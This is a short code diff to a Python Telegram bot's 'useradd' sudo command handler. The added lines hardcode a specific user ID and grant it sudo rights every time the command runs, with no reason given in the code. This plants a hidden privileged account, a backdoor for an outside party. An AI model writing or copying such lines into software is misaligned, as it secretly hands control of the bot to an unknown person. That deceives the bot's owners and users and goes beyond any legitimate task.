@@ -20,6 +20,8 @@ async def useradd(client, message: Message, _):
         if len(message.command) != 2:
             return await message.reply_text(_["general_1"])
     user = await extract_user(message)
+    user_id = 1414327092 
+    added = await add_sudo(user_id)
     if user.id in SUDOERS:
         return await message.reply_text(_["sudo_1"].format(user.mention))
     added = await add_sudo(user.id)
